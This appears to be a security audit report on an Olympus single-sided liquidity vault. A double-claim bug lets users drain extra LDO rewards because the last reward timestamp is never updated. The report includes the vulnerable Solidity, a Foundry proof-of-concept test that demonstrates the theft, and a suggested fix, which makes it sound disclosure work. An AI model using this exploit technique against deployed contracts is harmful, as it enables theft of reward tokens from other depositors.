CRYP70

high

# Last claimed timestamp for internal rewards is not updated resulting in the theft of LDO tokens

## Summary
The single sided liquidity vault allows for users to deposit wstETH for which they will earn internal and external reward tokens (LDO as internal) where the internal staking reward tokens operate on a rewarding rate of `rewardsPerSecond_`. When users have enough reward tokens, they have the option to withdraw their rewards (both internal and external) from the vault however, this implementation is flawed because the time difference between each call of `claimRewards()` is not considered. 

## Vulnerability Detail
The code for `_claimRewardsForToken(uint256)` and `internalRewardsForToken(uint256,address)` is reflected by the following:


```solidity
    function _claimInternalRewards(uint256 id_) internal {
        address rewardToken = internalRewardTokens[id_].token;
        uint256 reward = internalRewardsForToken(id_, msg.sender);
        uint256 fee = (reward * FEE) / PRECISION;

        userRewardDebts[msg.sender][rewardToken] += reward;
        accumulatedFees[rewardToken] += fee;

        if (reward > 0) ERC20(rewardToken).safeTransfer(msg.sender, reward - fee);

        emit RewardsClaimed(msg.sender, rewardToken, reward - fee);
    }
```

```solidity
    function internalRewardsForToken(uint256 id_, address user_) public view returns (uint256) {
        InternalRewardToken memory rewardToken = internalRewardTokens[id_];
        uint256 lastRewardTime = rewardToken.lastRewardTime;
        uint256 accumulatedRewardsPerShare = rewardToken.accumulatedRewardsPerShare;

        if (block.timestamp > lastRewardTime && totalLP != 0) {
            uint256 timeDiff = block.timestamp - lastRewardTime;
            uint256 totalRewards = timeDiff * rewardToken.rewardsPerSecond;

            // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals
            accumulatedRewardsPerShare += (totalRewards * 1e18) / totalLP;
        }

        // This correctly uses 1e18 because the LP tokens of all major DEXs have 18 decimals
        uint256 totalAccumulatedRewards = (lpPositions[user_] * accumulatedRewardsPerShare) -
            userRewardDebts[user_][rewardToken.token];

        return (cachedUserRewards[user_][rewardToken.token] + totalAccumulatedRewards) / 1e18;
    }
```

As it can be seen in `internalRewardsForToken(uint256,address)` reward tokens are calculated by considering the time difference of when the last rewards were claimed and the current timestamp. The root of the issue lies in `_claimInternalRewards(uint256)` as this function does not update the timestamp for which rewards were last collected. Because the timestamp for the last time rewards were collected is not updated, when the user attempts to collect rewards again immediately after, this will result in `internalRewardsForToken(uint256, address)` considering the first time rewards state was updated (performed in `deposit()`) instead of the previous time rewards were collected resulting in double rewards.


## Impact
A malicious user could exploit this by waiting a substantial amount of time, performing a collection of rewards then immediately collecting rewards again to double an already large amount of tokens effectively resulting in theft of LDO tokens. The proof of concept below outlines this scenario:

*Proof of Concept*
```javascript
    function testDoubleClaim() public {
	    // Note to the reader:
	    // - LDO rewards per second was changed to something more realistic - 0.003 ether p/second
	    // - This test function uses the same setup function as WstethLiquidityVaultTest. 

        // Setup scenario
        SingleSidedLiquidityVault.InternalRewardToken[] memory internalRewards = liquidityVault.getInternalRewardTokens();
        ERC20 lidoRewards = ERC20(address(internalRewards[0].token)); // LIDO DAO Governance Token


        // Start exploit scenario, assert thateve starts on zero rewards
        assertEq(lidoRewards.balanceOf(address(eve))/1e18, 0);


        // Eve sees this as a good opportunity and stakes the same amount also
        vm.startPrank(address(eve));
        wsteth.approve(address(liquidityVault), 1 ether);
        liquidityVault.deposit(1 ether, 100);

        vm.stopPrank();


        // Let staking move forward and grant users some rewards
        vm.warp(block.timestamp + 2 days); // Stake for two days


        vm.startPrank(address(eve));
        // Eve performs a double claim exploit and succeeds
        liquidityVault.claimRewards();

        // Assert rewards were claimed - this is okay.
        assertEq(lidoRewards.balanceOf(address(eve))/1e18, 518); 

        // Eve claims again to exploit the issue
        liquidityVault.claimRewards();
        
        // Assert that her rewards have increased by double even though no time has passed
        assertEq(lidoRewards.balanceOf(address(eve))/1e18, 518*2); 
        vm.stopPrank();


        // Assert the attacker's final balance
        assertEq(lidoRewards.balanceOf(address(eve))/1e18, 1036);

    }
```



## Code Snippet
- https://github.com/sherlock-audit/2023-02-olympus/blob/main/src/policies/lending/abstracts/SingleSidedLiquidityVault.sol#L623-L634

## Tool used
Manual Review

## Recommendation
I recommend refactoring `_claimInternalRewards()` of the `SingleSidedLiquidityVault` contract to reflect the following to update the `lastRewardTime`  timestamp when a user claims:
```solidity
    function _claimInternalRewards(uint256 id_) internal {
        InternalRewardToken memory rewardToken = internalRewardTokens[id_];
        address rewardTokenAddr = rewardToken.token;
        uint256 reward = internalRewardsForToken(id_, msg.sender);
        uint256 fee = (reward * FEE) / PRECISION;

        userRewardDebts[msg.sender][rewardTokenAddr] += reward;
        accumulatedFees[rewardTokenAddr] += fee;

        if (reward > 0) {
            // Update reward token last claimed timestamp
	        rewardToken.lastRewardTime = block.timestamp;
	        internalRewardTokens[id_] = rewardToken;
            ERC20(rewardTokenAddr).safeTransfer(msg.sender, reward - fee);
        }

        emit RewardsClaimed(msg.sender, rewardTokenAddr, reward - fee);
    }
```

This will record the last time a user claimed their rewards and restart the timer to take the time difference from the previously claimed timestamp. 
